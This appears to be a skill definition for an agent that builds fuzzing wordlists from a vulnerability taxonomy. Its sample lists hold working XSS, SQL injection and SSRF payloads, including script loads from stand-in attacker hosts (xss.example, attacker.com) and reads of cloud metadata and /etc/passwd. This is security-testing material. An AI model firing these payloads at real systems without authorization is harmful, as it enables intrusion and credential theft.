---
name: fuzzer-wordlist-generator
description: "Generate fuzzing wordlists and seed corpora from the-map taxonomy documents. This skill creates structured wordlists, parameter dictionaries, and fuzzer seeds based on mutation taxonomies. Triggered when the user requests 'create fuzzer wordlist', 'generate fuzzing seeds', 'make parameter dictionary', or wants systematic mutation seeds from taxonomy. Outputs include wordlists for ffuf/wfuzz/Burp Intruder, coverage-guided fuzzer seeds, and mutation templates."
---

# Fuzzer Wordlist Generator

Generate **fuzzing wordlists and seed corpora** from the-map vulnerability taxonomy documents. Create systematic mutation seeds for coverage-guided fuzzers and wordlists for parameter/endpoint enumeration.

## Core Principle

> **From Taxonomy to Systematic Fuzzing**
>
> The taxonomy's mutation variants become fuzzer seeds. Instead of random mutations, fuzzers target specific structural variations documented in the taxonomy, achieving systematic coverage of the attack surface.

---

## Workflow Overview

```
1. TARGET SELECTION    → Identify the-map document
2. TAXONOMY ANALYSIS   → Extract mutation variants
3. WORDLIST DESIGN     → Organize by mutation type
4. GENERATION          → Create wordlist files
5. VALIDATION          → Check uniqueness and coverage
6. DELIVERY            → Package with README and usage
```

---

## Phase 1-2: Target Selection & Analysis

Same as other generators - identify taxonomy and extract mutation variants.

---

## Phase 3: Wordlist Design

### Wordlist Categories

#### 1. Payload Wordlists

Organized by taxonomy category (§N).

```
wordlists/
├── payloads/
│   ├── [vuln]-category1-basic.txt
│   ├── [vuln]-category1-encoded.txt
│   ├── [vuln]-category1-bypass.txt
│   ├── [vuln]-category2-basic.txt
│   └── ...
```

#### 2. Parameter/Endpoint Wordlists

For discovery and enumeration.

```
wordlists/
├── parameters/
│   ├── [vuln]-common-params.txt
│   ├── [vuln]-api-params.txt
│   └── [vuln]-hidden-params.txt
├── endpoints/
│   ├── [vuln]-common-endpoints.txt
│   └── [vuln]-api-endpoints.txt
```

#### 3. Mutation Templates

For coverage-guided fuzzers (AFL, LibFuzzer, Jazzer).

```
seeds/
├── http/
│   ├── [vuln]-request-template1.txt
│   ├── [vuln]-request-template2.txt
│   └── ...
├── json/
│   ├── [vuln]-json-template1.json
│   └── ...
```

#### 4. Encoding Variations

Axis 2 bypass techniques.

```
wordlists/
├── encodings/
│   ├── url-encoding-variations.txt
│   ├── html-entity-variations.txt
│   ├── unicode-variations.txt
│   └── double-encoding.txt
```

---

## Phase 4: Generation Rules

### Rule 1: Taxonomy Mapping

```
Taxonomy Structure → Wordlist Organization
──────────────────────────────────────────────
§N. [Category] → [vuln]-[category]-basic.txt
  §N-M. [Subtype] → Each "Example" becomes a line

Axis 2 (Bypass) → [vuln]-[category]-bypass.txt
  Each bypass technique → Transformed payloads

Axis 3 (Scenario) → Context-specific wordlists
  Different contexts → Separate files
```

### Rule 2: Payload Format

```
# Basic wordlist (one payload per line)
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Commented wordlist (with taxonomy references)
# §1-1: Direct script injection
<script>alert(document.domain)</script>

# §1-2: Event handler auto-fire
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# §1-3: Embedded objects
<iframe src="javascript:alert(1)">
```

### Rule 3: Encoding Layers

Generate encoding variations:

```python
def generate_encodings(base_payload):
    """Generate encoding variations from Axis 2"""
    variations = [base_payload]

    # URL encoding
    variations.append(url_encode(base_payload))

    # Double URL encoding
    variations.append(url_encode(url_encode(base_payload)))

    # HTML entities
    variations.append(html_entity_encode(base_payload))

    # Unicode escapes
    variations.append(unicode_escape(base_payload))

    # Mixed encoding
    variations.append(mixed_encoding(base_payload))

    return variations
```

### Rule 4: Context-Specific Wordlists

Different contexts need different payloads:

```
xss-html-element.txt       → §1: HTML body context
xss-attribute-breakout.txt → §2: Attribute context
xss-javascript-context.txt → §3: JavaScript context
xss-url-context.txt        → §4: URL context
xss-css-context.txt        → §5: CSS context
```

---

## Generated Wordlist Examples

### XSS Payload Wordlist

```
# xss-html-element-basic.txt
# Taxonomy: the-map/01-injection/xss/xss.md §1
# Category: HTML Element Context
# Total: 47 payloads

# §1-1: Direct Script Tag Injection
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script src=https://xss.example/hook.js></script>
<script type="module">import('https://xss.example/hook.js')</script>

# §1-2: Event Handler Element Injection - Auto-firing
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<svg onload=alert(document.domain)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<div contenteditable autofocus onfocus=alert(1)>

# §1-2: Event Handler - Interaction-dependent
<button onclick=alert(1)>Click</button>
<a onmouseover=alert(1)>Hover</a>

# §1-3: Embedded Object Injection
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="javascript:alert(1)">
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
<base href="https://attacker.com/">

# ... (more payloads from taxonomy)
```

### SSRF URL Scheme Wordlist

```
# ssrf-url-scheme.txt
# Taxonomy: the-map/04-server-side/ssrf/ssrf.md §1
# Total: 38 schemes

# §1-1: HTTP/HTTPS Schemes
http://localhost
https://localhost
http://127.0.0.1
https://127.0.0.1
http://[::1]
http://0.0.0.0

# §1-2: File Schemes
file:///etc/passwd
file:///c:/windows/win.ini
file://localhost/etc/passwd

# §1-3: Cloud Metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# §1-4: Internal Network
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# §1-5: Protocol Wrappers
gopher://localhost:6379/_SSRF
dict://localhost:11211/
ldap://localhost:389/
ftp://localhost/

# §1-6: DNS Rebinding
http://rebinding.attacker.com

# ... (more schemes from taxonomy)
```

### SQL Injection Wordlist

```
# sqli-basic.txt
# Taxonomy: the-map/01-injection/sql-injection/sql-injection.md
# Total: 156 payloads

# §1: Classic UNION-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--

# §2: Boolean-based Blind
' AND 1=1--
' AND 1=2--
' OR '1'='1
' OR '1'='2

# §3: Time-based Blind
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
' OR SLEEP(5)--

# §4: Error-based
' AND 1=CONVERT(int,(SELECT @@version))--
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

# ... (more payloads from taxonomy)
```

### Parameter Names Wordlist

```
# common-api-parameters.txt
# Common parameter names for API fuzzing
# Derived from taxonomy attack scenarios

# Authentication/Session
token
api_key
apikey
api-key
access_token
refresh_token
session
sessionid
sid
auth
authorization

# User/Account
user
userid
user_id
username
email
account
accountid
uid
id

# IDOR/Authorization
id
object_id
document_id
file_id
resource_id
item_id
order_id
transaction_id

# SSRF/Redirect
url
target
redirect
redirect_url
redirect_uri
callback
callback_url
next
return_url
destination

# File Upload
file
upload
image
document
attachment
avatar
photo

# ... (more parameters)
```

---

## Fuzzer Seed Generation

### Coverage-Guided Fuzzer Seeds

For AFL, LibFuzzer, Jazzer:

```
# seeds/http/xss-request-template.txt
GET /search?q=FUZZ HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Accept: text/html

# seeds/http/sqli-post-template.txt
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=admin&password=FUZZ

# seeds/json/api-request-template.json
{
  "user_id": "FUZZ",
  "action": "update",
  "data": {
    "email": "test@example.com"
  }
}
```

### Burp Intruder Positions

```
# burp-intruder-positions.txt
# Attack type: Sniper
# Payload position markers: §PAYLOAD§

GET /search?q=§PAYLOAD§ HTTP/1.1
Host: target.com

POST /api/user HTTP/1.1
Host: target.com
Content-Type: application/json

{"user_id":"123","role":"§PAYLOAD§"}
```

---

## Phase 5: Validation

### Uniqueness Check

```python
def validate_wordlist(file_path):
    """Ensure no duplicate payloads"""
    with open(file_path) as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]

    unique_lines = set(lines)

    if len(lines) != len(unique_lines):
        print(f"[!] Duplicates found in {file_path}")
        print(f"    Total: {len(lines)}, Unique: {len(unique_lines)}")
        return False

    print(f"[+] {file_path}: {len(unique_lines)} unique payloads")
    return True
```

### Coverage Check

```
Verify all taxonomy subtypes are covered:

§1-1: 5 payloads ✓
§1-2: 12 payloads ✓
§1-3: 7 payloads ✓
...
Total: 47 payloads covering 10 subtypes ✓
```

---

## Phase 6: Delivery

### Package Structure

```
fuzzer-wordlists-[vulnerability]/
├── payloads/
│   ├── [vuln]-category1-basic.txt
│   ├── [vuln]-category1-bypass.txt
│   ├── [vuln]-category2-basic.txt
│   └── ...
├── parameters/
│   ├── common-params.txt
│   ├── api-params.txt
│   └── hidden-params.txt
├── endpoints/
│   └── common-endpoints.txt
├── encodings/
│   ├── url-encoding.txt
│   ├── html-entities.txt
│   └── unicode-variations.txt
├── seeds/
│   ├── http/
│   ├── json/
│   └── xml/
├── scripts/
│   ├── generate-encodings.py
│   ├── validate-wordlists.py
│   └── merge-wordlists.sh
└── README.md
```

### README Template

```markdown
# Fuzzer Wordlists - [Vulnerability]

Fuzzing wordlists and seed corpora for [vulnerability] based on
the-map mutation taxonomy.

## Contents

- **Payloads**: [N] category-specific wordlists
- **Parameters**: [M] parameter name dictionaries
- **Endpoints**: Common endpoint patterns
- **Encodings**: Bypass technique variations
- **Seeds**: Coverage-guided fuzzer templates
- **Scripts**: Generation and validation utilities

## Wordlist Categories

### Payloads

| File | Category | Payloads | Taxonomy |
|------|----------|----------|----------|
| [file].txt | §1 [Category] | [N] | §1-1 to §1-M |
| [file].txt | §2 [Category] | [M] | §2-1 to §2-P |
...

### Parameters

| File | Context | Parameters |
|------|---------|-----------|
| common-params.txt | General | [N] |
| api-params.txt | API testing | [M] |
...

## Usage

### ffuf

```bash
# Parameter fuzzing
ffuf -u https://target.com/FUZZ -w payloads/[vuln]-category1-basic.txt

# Value fuzzing
ffuf -u https://target.com/search?q=FUZZ -w payloads/[vuln]-category1-basic.txt

# Combined fuzzing (params + payloads)
ffuf -u https://target.com/FUZZ1?FUZZ2 \
     -w parameters/common-params.txt:FUZZ1 \
     -w payloads/[vuln]-category1-basic.txt:FUZZ2
```

### wfuzz

```bash
# Basic fuzzing
wfuzz -u https://target.com/search?q=FUZZ \
      -w payloads/[vuln]-category1-basic.txt

# Filter responses
wfuzz -u https://target.com/search?q=FUZZ \
      -w payloads/[vuln]-category1-basic.txt \
      --hc 404 --hw 0
```

### Burp Intruder

1. Load payloads: Intruder → Payloads → Load
2. Select file: `payloads/[vuln]-category1-basic.txt`
3. Attack type: Sniper/Pitchfork/Cluster bomb
4. Start attack

### Coverage-Guided Fuzzers

**AFL**:
```bash
# Use seeds from seeds/ directory
afl-fuzz -i seeds/http/ -o findings/ -- ./target @@
```

**LibFuzzer**:
```bash
# Merge seed corpus
./fuzzer seeds/json/ -merge=1
```

## Wordlist Statistics

| Category | Files | Total Payloads | Unique |
|----------|-------|---------------|--------|
| Payloads | [N] | [X] | [Y] |
| Parameters | [M] | [A] | [B] |
| Encodings | [P] | [C] | [D] |

## Encoding Variations

Generate encoding variations:

```bash
python3 scripts/generate-encodings.py \
        payloads/[vuln]-basic.txt \
        > payloads/[vuln]-encoded.txt
```

Includes:
- URL encoding (single, double, mixed)
- HTML entities (decimal, hex)
- Unicode escapes
- Case variations

## Validation

Validate wordlists for uniqueness and coverage:

```bash
python3 scripts/validate-wordlists.py payloads/
```

## Taxonomy Mapping

Complete mapping in TAXONOMY_MAPPING.md

## Scripts

### generate-encodings.py

Generate encoding variations from base wordlist.

```bash
python3 scripts/generate-encodings.py <input> > <output>
```

### validate-wordlists.py

Check uniqueness and taxonomy coverage.

```bash
python3 scripts/validate-wordlists.py <directory>
```

### merge-wordlists.sh

Merge multiple wordlists with deduplication.

```bash
bash scripts/merge-wordlists.sh file1.txt file2.txt > merged.txt
```

## License

MIT License
```

---

## Utility Scripts

### generate-encodings.py

```python
#!/usr/bin/env python3
"""Generate encoding variations from base wordlist"""

import sys
import urllib.parse
import html

def url_encode(s):
    return urllib.parse.quote(s)

def html_entity_encode(s):
    return html.escape(s).replace(' ', '&#32;')

def generate_variations(payload):
    """Generate all encoding variations"""
    yield payload  # Original

    # URL encoding
    yield url_encode(payload)
    yield url_encode(url_encode(payload))  # Double

    # HTML entities
    yield html_entity_encode(payload)

    # Case variations (for bypassing case-sensitive filters)
    yield payload.swapcase()

for line in sys.stdin:
    payload = line.strip()
    if not payload or payload.startswith('#'):
        continue

    for variation in generate_variations(payload):
        print(variation)
```

### validate-wordlists.py

```python
#!/usr/bin/env python3
"""Validate wordlist uniqueness and coverage"""

import sys
from pathlib import Path

def validate_file(file_path):
    with open(file_path) as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]

    unique = set(lines)
    duplicates = len(lines) - len(unique)

    print(f"{'✓' if duplicates == 0 else '✗'} {file_path.name}: "
          f"{len(unique)} unique ({duplicates} duplicates)")

    return duplicates == 0

directory = Path(sys.argv[1])
all_valid = all(validate_file(f) for f in directory.glob('*.txt'))

sys.exit(0 if all_valid else 1)
```

---

## Quality Checklist

- [ ] **All taxonomy subtypes have payloads in wordlists**
- [ ] **No duplicate entries within wordlists**
- [ ] **Wordlists organized by category (§N)**
- [ ] **Encoding variations generated for bypass testing**
- [ ] **Parameter/endpoint wordlists included**
- [ ] **Fuzzer seeds created for coverage-guided tools**
- [ ] **README documents all wordlists**
- [ ] **TAXONOMY_MAPPING.md complete**
- [ ] **Validation scripts test uniqueness**
- [ ] **Comments include taxonomy references**

---

## Delivery Message

```markdown
# Fuzzer Wordlists Generated

Created comprehensive fuzzing wordlists for [Vulnerability].

## Summary

- **Payload Wordlists**: [N] files, [X] total payloads
- **Parameter Dictionaries**: [M] files, [Y] parameters
- **Encoding Variations**: [P] transformation types
- **Fuzzer Seeds**: [Q] templates for coverage-guided fuzzing
- **Taxonomy Coverage**: [A]% of subtypes

## Quick Start

```bash
# ffuf fuzzing
ffuf -u https://target.com/search?q=FUZZ \
     -w payloads/[vuln]-basic.txt

# Generate encoding variations
python3 scripts/generate-encodings.py \
        payloads/[vuln]-basic.txt > encoded.txt
```

## Organization

Wordlists organized by taxonomy structure for systematic coverage.

All payloads backed by the-map taxonomy mutation variants.
```

---

## Notes

- **Format**: Plain text, one entry per line
- **Encoding**: UTF-8
- **Comments**: Lines starting with # (not counted as payloads)
- **Uniqueness**: Enforced via validation scripts
- **Taxonomy**: Every payload references source taxonomy section
- **Coverage**: Systematic coverage of all mutation variants
- **Usability**: Compatible with ffuf, wfuzz, Burp, AFL, LibFuzzer
